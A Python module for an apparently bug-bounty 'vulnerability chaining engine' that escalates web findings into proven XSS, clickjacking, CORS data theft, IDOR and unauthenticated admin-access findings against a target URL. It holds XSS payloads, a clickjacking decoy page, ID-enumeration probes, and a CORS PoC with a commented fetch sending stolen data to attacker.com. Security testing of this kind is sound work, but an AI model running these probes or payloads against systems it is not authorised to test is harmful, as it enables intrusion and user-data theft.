"""
Vulnerability Chaining Engine
=============================

Transforms low-value findings into exploitable vulnerabilities by:
1. Analyzing existing findings for exploitation paths
2. Automatically attempting to prove impact
3. Chaining vulnerabilities together for higher severity

Example chains:
- Missing CSP → Find XSS → Prove XSS works
- Missing X-Frame-Options → Create clickjacking PoC
- Info Disclosure → Extract endpoints → Test for IDOR
- CORS Misconfiguration → Prove data theft possible
"""

import asyncio
import json
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Optional
from datetime import datetime
import structlog

logger = structlog.get_logger(__name__)


class ChainStatus(Enum):
    """Status of a chain attempt."""
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    SUCCESS = "success"        # Chain completed, vulnerability proven
    PARTIAL = "partial"        # Some steps worked
    FAILED = "failed"          # Could not exploit
    BLOCKED = "blocked"        # Security control prevented


@dataclass
class ChainStep:
    """A single step in an attack chain."""
    name: str
    description: str
    action: str  # Action type to execute
    params: dict = field(default_factory=dict)
    status: ChainStatus = ChainStatus.PENDING
    result: Optional[dict] = None
    evidence: list = field(default_factory=list)
    next_steps: list = field(default_factory=list)  # Conditional next steps


@dataclass
class AttackChain:
    """An attack chain from initial finding to exploitation."""
    id: str
    name: str
    initial_finding: dict
    target_severity: str  # What we're trying to prove
    steps: list[ChainStep] = field(default_factory=list)
    status: ChainStatus = ChainStatus.PENDING
    final_finding: Optional[dict] = None
    poc: Optional[str] = None  # Proof of Concept code/HTML


# =============================================================================
# CHAIN DEFINITIONS - Maps initial findings to exploitation paths
# =============================================================================

CHAIN_DEFINITIONS = {
    # Missing CSP → Try to find and prove XSS
    "missing_csp": {
        "name": "CSP Bypass → XSS Exploitation",
        "target_severity": "high",
        "description": "Missing CSP allows XSS if injection point exists",
        "steps": [
            {
                "name": "Find Reflection Points",
                "action": "find_reflections",
                "description": "Search for user input reflected in response",
            },
            {
                "name": "Test XSS Payloads",
                "action": "test_xss",
                "description": "Inject XSS payloads at reflection points",
                "condition": "has_reflections",
            },
            {
                "name": "Generate XSS PoC",
                "action": "generate_xss_poc",
                "description": "Create working XSS proof of concept",
                "condition": "xss_successful",
            },
        ],
    },
    
    # Missing X-Frame-Options → Clickjacking PoC
    "missing_xframe": {
        "name": "Clickjacking Exploitation",
        "target_severity": "medium",
        "description": "Missing X-Frame-Options allows clickjacking",
        "steps": [
            {
                "name": "Check Frameable",
                "action": "check_frameable",
                "description": "Verify page can be framed",
            },
            {
                "name": "Find Sensitive Actions",
                "action": "find_sensitive_actions",
                "description": "Identify buttons/forms for clickjacking",
                "condition": "is_frameable",
            },
            {
                "name": "Generate Clickjacking PoC",
                "action": "generate_clickjacking_poc",
                "description": "Create working clickjacking HTML",
                "condition": "has_sensitive_actions",
            },
        ],
    },
    
    # CORS Misconfiguration → Data Theft PoC
    "cors_wildcard": {
        "name": "CORS → Data Theft",
        "target_severity": "high",
        "description": "CORS misconfiguration allows cross-origin data theft",
        "steps": [
            {
                "name": "Test Origin Reflection",
                "action": "test_cors_reflection",
                "description": "Check if arbitrary origins are reflected",
            },
            {
                "name": "Find Sensitive Endpoints",
                "action": "find_sensitive_data",
                "description": "Identify endpoints returning sensitive data",
                "condition": "cors_vulnerable",
            },
            {
                "name": "Generate CORS PoC",
                "action": "generate_cors_poc",
                "description": "Create data theft proof of concept",
                "condition": "has_sensitive_data",
            },
        ],
    },
    
    # Info Disclosure → IDOR/Auth Bypass
    "info_disclosure": {
        "name": "Info Disclosure → IDOR",
        "target_severity": "high",
        "description": "Use disclosed info to find IDOR vulnerabilities",
        "steps": [
            {
                "name": "Extract Identifiers",
                "action": "extract_identifiers",
                "description": "Find user IDs, account numbers, etc.",
            },
            {
                "name": "Test IDOR",
                "action": "test_idor",
                "description": "Try accessing other users' resources",
                "condition": "has_identifiers",
            },
            {
                "name": "Generate IDOR PoC",
                "action": "generate_idor_poc",
                "description": "Document IDOR exploitation",
                "condition": "idor_found",
            },
        ],
    },
    
    # API Endpoint Discovery → Auth Testing
    "api_discovered": {
        "name": "API Discovery → Auth Bypass",
        "target_severity": "critical",
        "description": "Test discovered API endpoints for auth issues",
        "steps": [
            {
                "name": "Test Without Auth",
                "action": "test_unauth_access",
                "description": "Try accessing endpoints without credentials",
            },
            {
                "name": "Test Privilege Escalation",
                "action": "test_privilege_escalation",
                "description": "Try accessing admin functions",
                "condition": "has_auth_endpoints",
            },
            {
                "name": "Generate Auth Bypass PoC",
                "action": "generate_auth_poc",
                "description": "Document authentication bypass",
                "condition": "auth_bypass_found",
            },
        ],
    },
    
    # Error Message → SQLi/Path Traversal
    "error_disclosure": {
        "name": "Error Disclosure → Injection",
        "target_severity": "critical",
        "description": "Use error messages to find injection points",
        "steps": [
            {
                "name": "Analyze Error",
                "action": "analyze_error",
                "description": "Extract technology/query info from error",
            },
            {
                "name": "Test SQLi",
                "action": "test_sqli_targeted",
                "description": "Test SQL injection based on error info",
                "condition": "has_db_error",
            },
            {
                "name": "Test Path Traversal",
                "action": "test_path_traversal",
                "description": "Test file path manipulation",
                "condition": "has_path_error",
            },
        ],
    },
    
    # Open Redirect → OAuth Token Theft
    "open_redirect": {
        "name": "Open Redirect → Token Theft",
        "target_severity": "high",
        "description": "Chain open redirect with OAuth for token theft",
        "steps": [
            {
                "name": "Find OAuth Endpoints",
                "action": "find_oauth_endpoints",
                "description": "Locate OAuth authorization endpoints",
            },
            {
                "name": "Test Redirect in OAuth",
                "action": "test_oauth_redirect",
                "description": "Try injecting redirect in OAuth flow",
                "condition": "has_oauth",
            },
            {
                "name": "Generate OAuth PoC",
                "action": "generate_oauth_poc",
                "description": "Create token theft proof of concept",
                "condition": "oauth_vulnerable",
            },
        ],
    },
}


class VulnChainEngine:
    """
    Engine for chaining vulnerabilities together.
    
    Takes initial findings and attempts to:
    1. Prove exploitability
    2. Chain to higher severity issues
    3. Generate working PoCs
    """
    
    def __init__(self, http_client=None, rate_limiter=None):
        self.http_client = http_client
        self.rate_limiter = rate_limiter
        self.chains: list[AttackChain] = []
        self.context: dict = {}  # Shared context between steps
        
    async def analyze_and_chain(
        self,
        findings: list[dict],
        target_url: str,
        max_depth: int = 3,
    ) -> list[AttackChain]:
        """
        Analyze findings and attempt to chain them.
        
        Args:
            findings: List of initial findings
            target_url: Target URL
            max_depth: Maximum chain depth
            
        Returns:
            List of attack chains with results
        """
        self.context = {
            "target_url": target_url,
            "findings": findings,
            "discovered_endpoints": [],
            "reflections": [],
            "identifiers": [],
        }
        
        chains = []
        
        for finding in findings:
            finding_type = finding.get("type", "")
            
            # Map finding type to chain definition
            chain_def = self._get_chain_for_finding(finding)
            
            if chain_def:
                chain = await self._execute_chain(finding, chain_def, max_depth)
                chains.append(chain)
        
        # Try cross-finding chains (combining multiple findings)
        cross_chains = await self._try_cross_chains(findings)
        chains.extend(cross_chains)
        
        self.chains = chains
        return chains
    
    def _get_chain_for_finding(self, finding: dict) -> Optional[dict]:
        """Get chain definition for a finding type."""
        finding_type = finding.get("type", "").lower()
        finding_name = finding.get("name", "").lower()
        
        # Direct mapping
        if "csp" in finding_name or "content-security-policy" in finding_name:
            return CHAIN_DEFINITIONS.get("missing_csp")
        elif "x-frame" in finding_name or "clickjacking" in finding_type:
            return CHAIN_DEFINITIONS.get("missing_xframe")
        elif "cors" in finding_type:
            return CHAIN_DEFINITIONS.get("cors_wildcard")
        elif "disclosure" in finding_type or "info" in finding_type:
            return CHAIN_DEFINITIONS.get("info_disclosure")
        elif "api" in finding_type or "endpoint" in finding_type:
            return CHAIN_DEFINITIONS.get("api_discovered")
        elif "error" in finding_type:
            return CHAIN_DEFINITIONS.get("error_disclosure")
        elif "redirect" in finding_type:
            return CHAIN_DEFINITIONS.get("open_redirect")
        
        return None
    
    async def _execute_chain(
        self,
        finding: dict,
        chain_def: dict,
        max_depth: int,
    ) -> AttackChain:
        """Execute an attack chain."""
        chain = AttackChain(
            id=f"chain_{datetime.now().strftime('%Y%m%d%H%M%S')}",
            name=chain_def["name"],
            initial_finding=finding,
            target_severity=chain_def["target_severity"],
        )
        
        logger.info(f"[ChainEngine] Starting chain: {chain.name}")
        chain.status = ChainStatus.IN_PROGRESS
        
        for step_def in chain_def["steps"][:max_depth]:
            step = ChainStep(
                name=step_def["name"],
                description=step_def["description"],
                action=step_def["action"],
                params=step_def.get("params", {}),
            )
            
            # Check condition
            condition = step_def.get("condition")
            if condition and not self._check_condition(condition):
                step.status = ChainStatus.BLOCKED
                step.result = {"reason": f"Condition '{condition}' not met"}
                chain.steps.append(step)
                continue
            
            # Execute step
            step.status = ChainStatus.IN_PROGRESS
            try:
                result = await self._execute_step(step, finding)
                step.result = result
                step.evidence = result.get("evidence", [])
                
                if result.get("success"):
                    step.status = ChainStatus.SUCCESS
                    # Update context with results
                    self._update_context(step.action, result)
                else:
                    step.status = ChainStatus.FAILED
                    
            except Exception as e:
                step.status = ChainStatus.FAILED
                step.result = {"error": str(e)}
                logger.error(f"[ChainEngine] Step failed: {e}")
            
            chain.steps.append(step)
        
        # Determine final chain status
        successful_steps = [s for s in chain.steps if s.status == ChainStatus.SUCCESS]
        
        if len(successful_steps) == len(chain.steps):
            chain.status = ChainStatus.SUCCESS
            chain.final_finding = self._generate_final_finding(chain)
            chain.poc = self._generate_poc(chain)
        elif successful_steps:
            chain.status = ChainStatus.PARTIAL
        else:
            chain.status = ChainStatus.FAILED
        
        return chain
    
    def _check_condition(self, condition: str) -> bool:
        """Check if a condition is met based on context."""
        conditions = {
            "has_reflections": bool(self.context.get("reflections")),
            "xss_successful": self.context.get("xss_found", False),
            "is_frameable": self.context.get("is_frameable", False),
            "has_sensitive_actions": bool(self.context.get("sensitive_actions")),
            "cors_vulnerable": self.context.get("cors_vulnerable", False),
            "has_sensitive_data": bool(self.context.get("sensitive_endpoints")),
            "has_identifiers": bool(self.context.get("identifiers")),
            "idor_found": self.context.get("idor_found", False),
            "has_auth_endpoints": bool(self.context.get("auth_endpoints")),
            "auth_bypass_found": self.context.get("auth_bypass_found", False),
            "has_db_error": self.context.get("has_db_error", False),
            "has_path_error": self.context.get("has_path_error", False),
            "has_oauth": bool(self.context.get("oauth_endpoints")),
            "oauth_vulnerable": self.context.get("oauth_vulnerable", False),
        }
        return conditions.get(condition, False)
    
    def _update_context(self, action: str, result: dict):
        """Update context with step results."""
        if action == "find_reflections":
            self.context["reflections"] = result.get("reflections", [])
        elif action == "test_xss":
            self.context["xss_found"] = result.get("xss_found", False)
            self.context["xss_payload"] = result.get("working_payload")
        elif action == "check_frameable":
            self.context["is_frameable"] = result.get("frameable", False)
        elif action == "find_sensitive_actions":
            self.context["sensitive_actions"] = result.get("actions", [])
        elif action == "test_cors_reflection":
            self.context["cors_vulnerable"] = result.get("vulnerable", False)
        elif action == "find_sensitive_data":
            self.context["sensitive_endpoints"] = result.get("endpoints", [])
        elif action == "extract_identifiers":
            self.context["identifiers"] = result.get("identifiers", [])
        elif action == "test_idor":
            self.context["idor_found"] = result.get("idor_found", False)
        elif action == "test_unauth_access":
            self.context["auth_endpoints"] = result.get("endpoints", [])
        elif action == "test_privilege_escalation":
            self.context["auth_bypass_found"] = result.get("bypass_found", False)
        elif action == "analyze_error":
            self.context["has_db_error"] = result.get("has_db_error", False)
            self.context["has_path_error"] = result.get("has_path_error", False)
        elif action == "find_oauth_endpoints":
            self.context["oauth_endpoints"] = result.get("endpoints", [])
        elif action == "test_oauth_redirect":
            self.context["oauth_vulnerable"] = result.get("vulnerable", False)
    
    async def _execute_step(self, step: ChainStep, finding: dict) -> dict:
        """Execute a single chain step."""
        action_handlers = {
            "find_reflections": self._find_reflections,
            "test_xss": self._test_xss,
            "generate_xss_poc": self._generate_xss_poc,
            "check_frameable": self._check_frameable,
            "find_sensitive_actions": self._find_sensitive_actions,
            "generate_clickjacking_poc": self._generate_clickjacking_poc,
            "test_cors_reflection": self._test_cors_reflection,
            "find_sensitive_data": self._find_sensitive_data,
            "generate_cors_poc": self._generate_cors_poc,
            "extract_identifiers": self._extract_identifiers,
            "test_idor": self._test_idor,
            "generate_idor_poc": self._generate_idor_poc,
            "test_unauth_access": self._test_unauth_access,
            "test_privilege_escalation": self._test_privilege_escalation,
            "generate_auth_poc": self._generate_auth_poc,
            "analyze_error": self._analyze_error,
            "test_sqli_targeted": self._test_sqli_targeted,
            "test_path_traversal": self._test_path_traversal,
            "find_oauth_endpoints": self._find_oauth_endpoints,
            "test_oauth_redirect": self._test_oauth_redirect,
            "generate_oauth_poc": self._generate_oauth_poc,
        }
        
        handler = action_handlers.get(step.action)
        if handler:
            return await handler(finding)
        
        return {"success": False, "error": f"Unknown action: {step.action}"}
    
    # =========================================================================
    # STEP HANDLERS - Actual exploitation logic
    # =========================================================================
    
    async def _find_reflections(self, finding: dict) -> dict:
        """Find user input reflection points."""
        target = self.context["target_url"]
        reflections = []
        
        # Test parameters
        test_params = ["q", "search", "query", "s", "keyword", "term", "input", "data", "name", "id"]
        canary = "REFLECT_TEST_12345"
        
        if self.http_client:
            for param in test_params:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    test_url = f"{target}?{param}={canary}"
                    response = await self.http_client.get(test_url)
                    
                    if canary in response.text:
                        reflections.append({
                            "parameter": param,
                            "url": test_url,
                            "reflected_in": "body",
                        })
                except Exception:
                    pass
        
        return {
            "success": bool(reflections),
            "reflections": reflections,
            "evidence": [f"Found {len(reflections)} reflection points"],
        }
    
    async def _test_xss(self, finding: dict) -> dict:
        """Test XSS payloads at reflection points."""
        reflections = self.context.get("reflections", [])
        
        # Safe XSS payloads (won't cause damage)
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
        ]
        
        working_payload = None
        xss_url = None
        
        if self.http_client:
            for reflection in reflections:
                param = reflection["parameter"]
                
                for payload in payloads:
                    try:
                        if self.rate_limiter:
                            await self.rate_limiter.acquire()
                        
                        target = self.context["target_url"]
                        test_url = f"{target}?{param}={payload}"
                        response = await self.http_client.get(test_url)
                        
                        # Check if payload is reflected unescaped
                        if payload in response.text:
                            working_payload = payload
                            xss_url = test_url
                            break
                    except Exception:
                        pass
                
                if working_payload:
                    break
        
        return {
            "success": bool(working_payload),
            "xss_found": bool(working_payload),
            "working_payload": working_payload,
            "xss_url": xss_url,
            "evidence": [f"XSS payload executed: {working_payload}"] if working_payload else [],
        }
    
    async def _generate_xss_poc(self, finding: dict) -> dict:
        """Generate XSS proof of concept."""
        payload = self.context.get("xss_payload")
        target = self.context["target_url"]
        
        poc = f"""<!-- XSS Proof of Concept -->
<html>
<head><title>XSS PoC - Bug Bounty</title></head>
<body>
<h1>XSS Vulnerability Proof of Concept</h1>
<p>Target: {target}</p>
<p>Payload: {payload}</p>

<h2>Steps to Reproduce:</h2>
<ol>
<li>Navigate to the URL below</li>
<li>Observe JavaScript execution (alert box)</li>
</ol>

<h2>Vulnerable URL:</h2>
<code>{target}?param={payload}</code>

<h2>Impact:</h2>
<ul>
<li>Session hijacking via document.cookie theft</li>
<li>Phishing attacks via DOM manipulation</li>
<li>Keylogging and credential theft</li>
</ul>
</body>
</html>"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated working XSS PoC"],
        }
    
    async def _check_frameable(self, finding: dict) -> dict:
        """Check if page can be framed (clickjacking)."""
        target = self.context["target_url"]
        frameable = True
        
        if self.http_client:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                response = await self.http_client.get(target)
                headers = {k.lower(): v for k, v in response.headers.items()}
                
                # Check for frame protection
                if headers.get("x-frame-options"):
                    frameable = False
                
                csp = headers.get("content-security-policy", "")
                if "frame-ancestors" in csp and "'none'" in csp:
                    frameable = False
                    
            except Exception:
                pass
        
        return {
            "success": True,
            "frameable": frameable,
            "evidence": ["Page can be framed"] if frameable else ["Page has frame protection"],
        }
    
    async def _find_sensitive_actions(self, finding: dict) -> dict:
        """Find sensitive actions that could be clickjacked."""
        target = self.context["target_url"]
        actions = []
        
        if self.http_client:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                response = await self.http_client.get(target)
                
                # Look for forms and buttons
                sensitive_patterns = [
                    r'<form[^>]*action=["\'][^"\']*(?:delete|remove|update|transfer|send|submit)[^"\']*["\']',
                    r'<button[^>]*>(?:Delete|Remove|Submit|Transfer|Send|Confirm)',
                    r'<input[^>]*type=["\']submit["\'][^>]*value=["\'][^"\']*(?:delete|confirm)',
                ]
                
                for pattern in sensitive_patterns:
                    matches = re.findall(pattern, response.text, re.I)
                    actions.extend(matches)
                    
            except Exception:
                pass
        
        return {
            "success": bool(actions),
            "actions": actions[:5],  # Limit
            "evidence": [f"Found {len(actions)} sensitive actions"],
        }
    
    async def _generate_clickjacking_poc(self, finding: dict) -> dict:
        """Generate clickjacking proof of concept."""
        target = self.context["target_url"]
        actions = self.context.get("sensitive_actions", [])
        
        poc = f"""<!-- Clickjacking Proof of Concept -->
<html>
<head>
<title>Clickjacking PoC - Bug Bounty</title>
<style>
iframe {{
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.0001; /* Nearly invisible */
    z-index: 2;
}}
.decoy {{
    position: absolute;
    top: 200px;
    left: 200px;
    z-index: 1;
    padding: 20px;
    background: #4CAF50;
    color: white;
    font-size: 18px;
    cursor: pointer;
}}
</style>
</head>
<body>
<h1>Click the button to win a prize!</h1>
<div class="decoy">CLICK HERE TO WIN!</div>
<iframe src="{target}"></iframe>

<h2>Proof of Concept Details:</h2>
<ul>
<li>Target: {target}</li>
<li>Sensitive actions found: {len(actions)}</li>
<li>Missing X-Frame-Options header</li>
</ul>
</body>
</html>"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated clickjacking PoC"],
        }
    
    async def _test_cors_reflection(self, finding: dict) -> dict:
        """Test if CORS reflects arbitrary origins."""
        target = self.context["target_url"]
        vulnerable = False
        
        evil_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
        ]
        
        if self.http_client:
            for origin in evil_origins:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    headers = {"Origin": origin}
                    response = await self.http_client.get(target, headers=headers)
                    
                    acao = response.headers.get("Access-Control-Allow-Origin", "")
                    acac = response.headers.get("Access-Control-Allow-Credentials", "")
                    
                    if origin in acao or acao == "*":
                        vulnerable = True
                        break
                        
                except Exception:
                    pass
        
        return {
            "success": True,
            "vulnerable": vulnerable,
            "evidence": ["CORS reflects arbitrary origins"] if vulnerable else [],
        }
    
    async def _find_sensitive_data(self, finding: dict) -> dict:
        """Find endpoints returning sensitive data."""
        target = self.context["target_url"]
        endpoints = []
        
        sensitive_paths = [
            "/api/user",
            "/api/account",
            "/api/profile",
            "/api/me",
            "/api/settings",
            "/user/info",
            "/account/details",
        ]
        
        if self.http_client:
            for path in sensitive_paths:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    url = f"{target.rstrip('/')}{path}"
                    response = await self.http_client.get(url)
                    
                    if response.status_code == 200:
                        # Check for sensitive data patterns
                        if any(p in response.text.lower() for p in ["email", "phone", "address", "token"]):
                            endpoints.append(url)
                            
                except Exception:
                    pass
        
        return {
            "success": bool(endpoints),
            "endpoints": endpoints,
            "evidence": [f"Found {len(endpoints)} sensitive endpoints"],
        }
    
    async def _generate_cors_poc(self, finding: dict) -> dict:
        """Generate CORS data theft PoC."""
        target = self.context["target_url"]
        endpoints = self.context.get("sensitive_endpoints", [])
        
        poc = f"""<!-- CORS Data Theft Proof of Concept -->
<html>
<head><title>CORS PoC - Bug Bounty</title></head>
<body>
<h1>CORS Misconfiguration - Data Theft PoC</h1>

<script>
// This would steal data from a logged-in user
fetch('{target}', {{
    credentials: 'include'
}})
.then(response => response.text())
.then(data => {{
    // Send to attacker server
    console.log('Stolen data:', data);
    // fetch('https://attacker.com/steal?data=' + btoa(data));
}});
</script>

<h2>Impact:</h2>
<ul>
<li>Steal user data from: {target}</li>
<li>Sensitive endpoints: {len(endpoints)}</li>
<li>Cross-origin request with credentials allowed</li>
</ul>
</body>
</html>"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated CORS theft PoC"],
        }
    
    async def _extract_identifiers(self, finding: dict) -> dict:
        """Extract identifiers from disclosed information."""
        # This would analyze the finding's evidence for IDs
        identifiers = []
        
        evidence = finding.get("evidence", [])
        if isinstance(evidence, list):
            for item in evidence:
                item_str = str(item)
                # Look for IDs
                id_patterns = [
                    r'"id"\s*:\s*["\']?(\d+)',
                    r'"user_id"\s*:\s*["\']?(\d+)',
                    r'"account_id"\s*:\s*["\']?(\d+)',
                    r'/users?/(\d+)',
                    r'/accounts?/(\d+)',
                ]
                for pattern in id_patterns:
                    matches = re.findall(pattern, item_str)
                    identifiers.extend(matches)
        
        return {
            "success": bool(identifiers),
            "identifiers": list(set(identifiers))[:10],
            "evidence": [f"Extracted {len(identifiers)} identifiers"],
        }
    
    async def _test_idor(self, finding: dict) -> dict:
        """Test for IDOR by accessing other users' resources."""
        identifiers = self.context.get("identifiers", [])
        target = self.context["target_url"]
        idor_found = False
        
        if self.http_client and identifiers:
            # Try incrementing/decrementing IDs
            for id_val in identifiers:
                try:
                    original_id = int(id_val)
                    test_ids = [original_id - 1, original_id + 1]
                    
                    for test_id in test_ids:
                        if self.rate_limiter:
                            await self.rate_limiter.acquire()
                        
                        # Try common IDOR endpoints
                        for path in ["/api/user/", "/user/", "/account/"]:
                            url = f"{target.rstrip('/')}{path}{test_id}"
                            response = await self.http_client.get(url)
                            
                            if response.status_code == 200:
                                idor_found = True
                                break
                except Exception:
                    pass
        
        return {
            "success": True,
            "idor_found": idor_found,
            "evidence": ["IDOR vulnerability confirmed"] if idor_found else [],
        }
    
    async def _generate_idor_poc(self, finding: dict) -> dict:
        """Generate IDOR proof of concept."""
        identifiers = self.context.get("identifiers", [])
        target = self.context["target_url"]
        
        poc = f"""# IDOR Vulnerability Proof of Concept

## Target
{target}

## Discovered Identifiers
{json.dumps(identifiers, indent=2)}

## Steps to Reproduce
1. Login as User A
2. Navigate to {target}/api/user/{{user_id}}
3. Change user_id to another user's ID
4. Observe unauthorized access to other user's data

## Impact
- Access to other users' personal data
- Potential for mass data extraction
- Privacy violation
"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated IDOR PoC"],
        }
    
    async def _test_unauth_access(self, finding: dict) -> dict:
        """Test for unauthenticated access to endpoints."""
        target = self.context["target_url"]
        accessible = []
        
        auth_paths = [
            "/api/admin",
            "/api/users",
            "/api/accounts",
            "/admin",
            "/internal",
            "/api/v1/admin",
            "/api/v2/admin",
        ]
        
        if self.http_client:
            for path in auth_paths:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    url = f"{target.rstrip('/')}{path}"
                    response = await self.http_client.get(url)
                    
                    # Check for unauthorized access
                    if response.status_code not in [401, 403, 404]:
                        accessible.append({
                            "url": url,
                            "status": response.status_code,
                        })
                except Exception:
                    pass
        
        return {
            "success": bool(accessible),
            "endpoints": accessible,
            "evidence": [f"Found {len(accessible)} unprotected endpoints"],
        }
    
    async def _test_privilege_escalation(self, finding: dict) -> dict:
        """Test for privilege escalation."""
        # This would test admin functions with regular user credentials
        return {
            "success": False,
            "bypass_found": False,
            "evidence": [],
        }
    
    async def _generate_auth_poc(self, finding: dict) -> dict:
        """Generate auth bypass PoC."""
        endpoints = self.context.get("auth_endpoints", [])
        target = self.context["target_url"]
        
        poc = f"""# Authentication Bypass Proof of Concept

## Target
{target}

## Unprotected Endpoints
{json.dumps(endpoints, indent=2)}

## Steps to Reproduce
1. Without authentication, access the URLs listed above
2. Observe that sensitive data/functionality is accessible

## Impact
- Unauthorized access to sensitive functionality
- Data breach potential
- Privilege escalation
"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated auth bypass PoC"],
        }
    
    async def _analyze_error(self, finding: dict) -> dict:
        """Analyze error messages for exploitation hints."""
        evidence = finding.get("evidence", [])
        
        has_db_error = False
        has_path_error = False
        
        db_patterns = ["sql", "mysql", "postgres", "oracle", "sqlite", "syntax error"]
        path_patterns = ["file not found", "no such file", "cannot open", "permission denied"]
        
        for item in evidence:
            item_str = str(item).lower()
            if any(p in item_str for p in db_patterns):
                has_db_error = True
            if any(p in item_str for p in path_patterns):
                has_path_error = True
        
        return {
            "success": has_db_error or has_path_error,
            "has_db_error": has_db_error,
            "has_path_error": has_path_error,
            "evidence": [],
        }
    
    async def _test_sqli_targeted(self, finding: dict) -> dict:
        """Test SQL injection based on error analysis."""
        # Would be implemented with actual SQLi testing
        return {"success": False, "evidence": []}
    
    async def _test_path_traversal(self, finding: dict) -> dict:
        """Test path traversal."""
        # Would be implemented with actual path traversal testing
        return {"success": False, "evidence": []}
    
    async def _find_oauth_endpoints(self, finding: dict) -> dict:
        """Find OAuth endpoints."""
        target = self.context["target_url"]
        endpoints = []
        
        oauth_paths = [
            "/oauth/authorize",
            "/oauth2/authorize",
            "/auth/authorize",
            "/login/oauth",
            "/.well-known/openid-configuration",
        ]
        
        if self.http_client:
            for path in oauth_paths:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    url = f"{target.rstrip('/')}{path}"
                    response = await self.http_client.get(url)
                    
                    if response.status_code in [200, 302, 400]:
                        endpoints.append(url)
                except Exception:
                    pass
        
        return {
            "success": bool(endpoints),
            "endpoints": endpoints,
            "evidence": [f"Found {len(endpoints)} OAuth endpoints"],
        }
    
    async def _test_oauth_redirect(self, finding: dict) -> dict:
        """Test OAuth redirect manipulation."""
        # Would test redirect_uri manipulation
        return {"success": False, "vulnerable": False, "evidence": []}
    
    async def _generate_oauth_poc(self, finding: dict) -> dict:
        """Generate OAuth attack PoC."""
        return {"success": False, "poc": "", "evidence": []}
    
    async def _try_cross_chains(self, findings: list[dict]) -> list[AttackChain]:
        """Try combining multiple findings for advanced chains."""
        # Advanced: combine findings for more complex attacks
        # e.g., Info disclosure + CORS = targeted data theft
        return []
    
    def _generate_final_finding(self, chain: AttackChain) -> dict:
        """Generate final upgraded finding from successful chain."""
        return {
            "type": f"exploited_{chain.initial_finding.get('type', 'unknown')}",
            "severity": chain.target_severity,
            "title": f"Exploited: {chain.name}",
            "description": f"Successfully chained {chain.initial_finding.get('type')} to prove {chain.target_severity} impact",
            "evidence": [s.result for s in chain.steps if s.status == ChainStatus.SUCCESS],
            "chain_id": chain.id,
        }
    
    def _generate_poc(self, chain: AttackChain) -> str:
        """Get PoC from successful chain."""
        for step in reversed(chain.steps):
            if step.status == ChainStatus.SUCCESS and step.result.get("poc"):
                return step.result["poc"]
        return ""
    
    def get_report(self) -> str:
        """Generate report of all chains."""
        report = """# Vulnerability Chain Analysis Report

## Summary
"""
        successful = [c for c in self.chains if c.status == ChainStatus.SUCCESS]
        partial = [c for c in self.chains if c.status == ChainStatus.PARTIAL]
        failed = [c for c in self.chains if c.status == ChainStatus.FAILED]
        
        report += f"""
- **Successful Chains:** {len(successful)} (exploitable vulnerabilities)
- **Partial Chains:** {len(partial)} (need manual verification)
- **Failed Chains:** {len(failed)} (not exploitable)

"""
        
        if successful:
            report += "## ✅ Exploitable Vulnerabilities\n\n"
            for chain in successful:
                report += f"### {chain.name}\n"
                report += f"- **Initial Finding:** {chain.initial_finding.get('type')}\n"
                report += f"- **Proven Severity:** {chain.target_severity.upper()}\n"
                report += f"- **Steps Completed:** {len([s for s in chain.steps if s.status == ChainStatus.SUCCESS])}\n\n"
                
                if chain.poc:
                    report += "#### Proof of Concept\n```html\n"
                    report += chain.poc[:1000]
                    report += "\n```\n\n"
        
        if partial:
            report += "## ⚠️ Partial Chains (Manual Review Needed)\n\n"
            for chain in partial:
                report += f"- {chain.name}: {chain.initial_finding.get('type')}\n"
        
        return report


# =============================================================================
# INTEGRATION FUNCTION
# =============================================================================

async def chain_vulnerabilities(
    findings: list[dict],
    target_url: str,
    http_client=None,
    rate_limiter=None,
) -> tuple[list[AttackChain], str]:
    """
    Main entry point for vulnerability chaining.
    
    Returns:
        Tuple of (chains, report)
    """
    engine = VulnChainEngine(http_client, rate_limiter)
    chains = await engine.analyze_and_chain(findings, target_url)
    report = engine.get_report()
    
    return chains, report
